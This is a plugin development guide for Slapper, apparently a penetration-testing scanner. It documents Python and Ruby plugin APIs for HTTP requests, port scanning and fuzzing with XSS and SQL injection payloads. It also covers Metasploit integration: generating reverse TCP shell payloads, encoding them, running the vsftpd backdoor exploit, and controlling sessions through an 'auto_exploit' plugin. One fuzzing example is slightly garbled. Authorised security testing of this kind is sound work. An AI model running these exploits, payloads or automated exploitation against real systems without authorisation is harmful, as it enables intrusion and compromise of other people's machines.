# Plugin Development Guide

Slapper supports extending its functionality through plugins written in Python or Ruby. This guide covers how to create, configure, and use plugins.

## Table of Contents

- [Overview](#overview)
- [Python Plugins](#python-plugins)
- [Ruby Plugins](#ruby-plugins)
- [Plugin Configuration](#plugin-configuration)
- [Examples](#examples)

## Overview

### When to Use Plugins

Plugins are useful for:
- Custom vulnerability checks specific to your application
- Integration with external tools (e.g., Metasploit)
- Specialized scanning logic
- Custom payload delivery mechanisms

### Plugin Location

Place plugins in:
- `~/.config/slapper/plugins/` (user plugins)
- `./plugins/` (project plugins)

## Python Plugins

### Building with Python Support

```bash
cargo build --release --features python-plugins
```

### Plugin Structure

```python
from typing import Dict, List, Optional
from dataclasses import dataclass
import json

@dataclass
class Finding:
    """Represents a security finding."""
    severity: str      # critical, high, medium, low, info
    finding_type: str  # e.g., "sql_injection", "xss"
    description: str
    location: str
    evidence: Optional[str] = None
    references: Optional[List[str]] = None
    cvss_score: Optional[float] = None

class MyPlugin:
    """Your custom security scanner."""
    
    @property
    def name(self) -> str:
        """Plugin identifier."""
        return "my_plugin"
    
    @property
    def version(self) -> str:
        """Plugin version."""
        return "1.0.0"
    
    def run(self, target: str, config: Dict) -> Dict:
        """
        Execute the plugin scan.
        
        Args:
            target: Target URL or hostname
            config: Plugin configuration from slapper.toml
            
        Returns:
            Dict with 'target', 'findings', 'success', and optional 'error'
        """
        findings = []
        
        # Your scanning logic here
        # Make HTTP requests, analyze responses
        
        return {
            "target": target,
            "findings": findings,
            "success": True,
            "metadata": {"plugin": self.name}
        }

# Required: Register your plugin
PLUGINS = [MyPlugin]
```

### Using Python HTTP Libraries

Python plugins can use any Python HTTP library. Example using `requests`:

```python
import requests

class WebScanner:
    @property
    def name(self) -> str:
        return "web_scanner"
    
    def run(self, target: str, config: Dict) -> Dict:
        findings = []
        
        # Make HTTP request
        try:
            response = requests.get(target, timeout=10)
            
            # Check for security issues
            if response.status_code == 200:
                if 'X-Frame-Options' not in response.headers:
                    findings.append(Finding(
                        severity="medium",
                        finding_type="missing_header",
                        description="Missing X-Frame-Options header",
                        location=target,
                        evidence="Header not present in response"
                    ))
        except Exception as e:
            return {"target": target, "findings": [], "success": False, "error": str(e)}
        
        return {"target": target, "findings": findings, "success": True}

PLUGINS = [WebScanner]
```

### Configuration

Add to `slapper.toml`:

```toml
[plugins.my_plugin]
option1 = "value1"
option2 = true

[plugins.web_scanner]
timeout = 30
follow_redirects = true
```

---

## Ruby Plugins

### Building with Ruby Support

```bash
cargo build --release --features ruby-plugins
```

**Requirements:**
- Ruby 3.0+ development headers
- For Metasploit integration: Metasploit Framework installed

### Plugin Structure

```ruby
module Slapper
  class Plugin
    NAME = "my_ruby_plugin"
    VERSION = "1.0.0"
    AUTHOR = "Your Name"
    DESCRIPTION = "Description of what this plugin does"
    
    def run(target, config = {})
      # Plugin logic
      
      {
        success: true,
        target: target,
        results: []
      }
    end
  end
end
```

### Ruby API

#### HTTP Requests

```ruby
# GET request
response = Slapper::HTTP.get("https://example.com")
puts response['status']  # HTTP status code
puts response['body']    # Response body

# POST request
response = Slapper::HTTP.post(url, body_data)

# PUT request  
response = Slapper::HTTP.put(url, data)

# DELETE request
response = Slapper::HTTP.delete(url)

# Custom request
response = Slapper::HTTP.request("PATCH", url)
```

#### Port Scanning

```ruby
# TCP connect check
open = Slapper::Scanner.tcp_connect("example.com", 80)
puts "Port open: #{open}"

# Scan port
open = Slapper::Scanner.scan_port("192.168.1.1", 443)

# Grab banner
banner = Slapper::Scanner.grab_banner("example.com", 21)
```

#### Fuzzing

```ruby
# Fuzz URL parameters
results = Slapper::Fuzzer.fuzz_param(
  "https://example.com/search",  # URL
  "q",                            # Parameter to fuzz
  ["<script>alert(1)</script>", "' OR 1=1--"],  # Payloads
  []                              # Options
)

results.each do |r|
  puts "URL: #{r['url']}, Vulnerable: #{r['vulnerable']}"
end

# Fuzz headers
results = Slapper::Fuzzer.fuzz_header(
example.com",
   "https:// "X-Custom-Header",
  ["payload1", "payload2"],
  []
)

# Fuzz cookies
results = Slapper::Fuzzer.fuzz_cookie(
  "https://example.com",
  "session_id",
  ["' OR '1'='1", "admin'--"],
  []
)

# Fuzz paths
results = Slapper::Fuzzer.fuzz_path(
  "https://example.com",
  ["/admin", "/config", "/.env"]
)
```

### Metasploit Integration

The Ruby plugin system provides deep integration with Metasploit Framework via RPC.

#### Connecting to Metasploit

```ruby
# Connect with username/password
Slapper::Metasploit.connect(
  "http://127.0.0.1:55553",  # MSF RPC URL
  "msf",                       # Username
  "password"                   # Password
)

# Or with token
Slapper::Metasploit.connect_with_token(
  "http://127.0.0.1:55553",
  "TOKEN_HERE"
)

# Check connection
if Slapper::Metasploit.connected?
  puts "Connected!"
end
```

#### Working with Modules

```ruby
# List available modules
exploits = Slapper::Metasploit.list_modules("exploit")
auxiliaries = Slapper::Metasploit.list_modules("auxiliary")
payloads = Slapper::Metasploit.list_modules("payload")
encoders = Slapper::Metasploit.list_modules("encoder")

# Get module info
info = Slapper::Metasploit.module_info("exploit", "unix/ftp/vsftpd_234_backdoor")
puts info['description']
```

#### Generating Payloads

```ruby
# Generate a payload
payload = Slapper::Metasploit.generate_payload(
  "linux/x86/shell_reverse_tcp",
  ["LHOST=192.168.1.1", "LPORT=4444"]
)

# payload is base64 encoded

# Encode with specific encoder
encoded = Slapper::Encoder.encode(payload, "x86/shikata_ga_nai", [])
```

#### Executing Exploits

```ruby
# Execute an exploit
result = Slapper::Metasploit.execute_module(
  "exploit",
  "unix/ftp/vsftpd_234_backdoor",
  ["RHOST=192.168.1.1", "RPORT=21"]
)

if result['success']
  puts "Exploit started! UUID: #{result['uuid']}"
end
```

#### Session Management

```ruby
# List active sessions
sessions = Slapper::Metasploit.list_sessions

sessions.each do |session|
  puts "Session #{session['id']}: #{session['type']}"
end

# Get session info
info = Slapper::Metasploit.session_info("1")

# Execute commands
Slapper::Metasploit.session_shell_write("1", "whoami\n")

# Read output
output = Slapper::Metasploit.session_shell_read("1")
puts output

# Upgrade shell to meterpreter
Slapper::Session.shell_upgrade("1", "192.168.1.1", "4444")

# Stop session
Slapper::Metasploit.session_stop("1")
```

#### Reporting

```ruby
# Log findings
Slapper::Report.finding("high", "sql_injection", "SQLi found in login form", "https://example.com/login")
Slapper::Report.vulnerability("critical", "remote_code_exec", "RCE via deserialization", "https://example.com/api", "CVE-2024-1234")
Slapper::Report.info("Scan", "Starting custom scan")
Slapper::Report.success("Plugin", "Completed successfully")
Slapper::Report.warning("Rate Limit", "Being throttled")
Slapper::Report.error("Connection", "Failed to connect")
```

### Example: Complete Metasploit Plugin

```ruby
module Slapper
  class Plugin
    NAME = "auto_exploit"
    VERSION = "1.0.0"
    
    def run(target, config = {})
      results = []
      
      # Connect to Metasploit
      msf_url = config['msf_url'] || "http://127.0.0.1:55553"
      msf_user = config['msf_user'] || "msf"
      msf_pass = config['msf_password'] || "password"
      
      unless Slapper::Metasploit.connected?
        Slapper::Metasploit.connect(msf_url, msf_user, msf_pass)
      end
      
      Slapper::Report.info("Plugin", "Connected to Metasploit")
      
      # Get target IP from URL
      target_ip = target.gsub(/https?:\/\//, '').split('/').first
      
      # Try common exploits
      exploits = [
        "exploit/unix/ftp/vsftpd_234_backdoor",
        "exploit/unix/ssh/openssh_key_interpreter"
      ]
      
      exploits.each do |exploit|
        Slapper::Report.info("Exploit", "Trying #{exploit}")
        
        begin
          result = Slapper::Metasploit.execute_module(
            "exploit",
            exploit,
            ["RHOST=#{target_ip}"]
          )
          
          if result['success']
            results << { exploit: exploit, uuid: result['uuid'] }
            Slapper::Report.success("Exploit", "#{exploit} succeeded!")
          end
        rescue => e
          Slapper::Report.warning("Exploit", "#{exploit} failed: #{e.message}")
        end
      end
      
      # Wait for sessions
      sleep 5
      sessions = Slapper::Metasploit.list_sessions
      
      sessions.each do |session|
        Slapper::Report.success("Session", "Got session #{session['id']}")
      end
      
      {
        success: true,
        target: target,
        results: results,
        sessions: sessions.length
      }
    end
  end
end
```

## Plugin Configuration

### Enabling Plugins

Add to `slapper.toml`:

```toml
[plugins]
enabled = true

[plugins.python]
enabled = true

[plugins.ruby]
enabled = true
```

### Per-Plugin Configuration

```toml
[plugins.my_plugin]
option1 = "value"
option2 = 123

[plugins.metasploit_plugin]
msf_url = "http://localhost:55553"
msf_user = "msf"
msf_password = "password"
```

## Running Plugins

```bash
# Run specific plugin
./slapper run-plugin my_plugin --target https://example.com

# List available plugins
./slapper list-plugins

# Run with config
./slapper run-plugin metasploit --target http://target.com --config my_config.toml
```

## Best Practices

1. **Error handling** - Always handle exceptions and return proper error status
2. **Rate limiting** - Respect target rate limits to avoid being blocked
3. **Scope checking** - Verify targets are within authorized scope
4. **Reporting** - Use the reporting API for consistent output
5. **Cleanup** - Close any open connections or resources
